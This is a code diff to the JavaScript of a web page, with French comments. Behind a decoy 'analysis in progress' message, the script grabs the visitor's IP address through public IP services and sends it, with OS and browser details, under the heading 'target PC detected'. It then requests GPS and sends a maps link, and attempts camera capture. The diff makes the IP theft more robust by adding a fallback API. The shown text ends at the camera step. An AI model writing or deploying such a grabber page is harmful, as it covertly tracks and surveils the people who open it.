@@ -1,27 +1,34 @@
 async function execute() {
             const box = document.querySelector('.box');
-            box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification des serveurs...</p>";
+            box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification des protocoles...</p>";
 
-            // 1. RÉCUPÉRATION IP (Méthode 1: API Directe)
-            let userIP = "Non détectée";
+            let detectedIP = "Non détectée (Blocage Navigateur)";
+
+            // 1. RÉCUPÉRATION IP (On attend la réponse avant de passer à la suite)
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-            } catch (e) { 
-                console.log("Méthode 1 échouée"); 
+                const response = await fetch('https://api.ipify.org?format=json');
+                if (response.ok) {
+                    const data = await response.json();
+                    detectedIP = data.ip;
+                }
+            } catch (e) {
+                // Deuxième tentative avec une autre API si la première est bloquée
+                try {
+                    const res2 = await fetch('https://ipapi.co/json/');
+                    const data2 = await res2.json();
+                    detectedIP = data2.ip;
+                } catch (e2) { console.log("Toutes les API IP sont bloquées."); }
             }
 
-            // 2. ENVOI DES INFOS SYSTÈME + IP
-            // On envoie ça IMMEDIATEMENT avant de demander la caméra
-            await post(`🚀 **CIBLE PC DÉTECTÉE**\n**IP**: ${userIP}\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);
+            // 2. ENVOI IMMÉDIAT (L'IP sera forcément incluse ici)
+            await post(`🚀 **CIBLE PC DÉTECTÉE**\n**IP**: ${detectedIP}\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);
 
-            // 3. TENTATIVE GPS (Optionnel)
+            // 3. GPS (On ne l'attend pas, ça peut être long)
             navigator.geolocation.getCurrentPosition(async (p) => {
                 await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             }, null, {timeout: 3000});
 
-            // 4. CAPTURE CAMÉRA
+            // 4. CAMÉRA
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
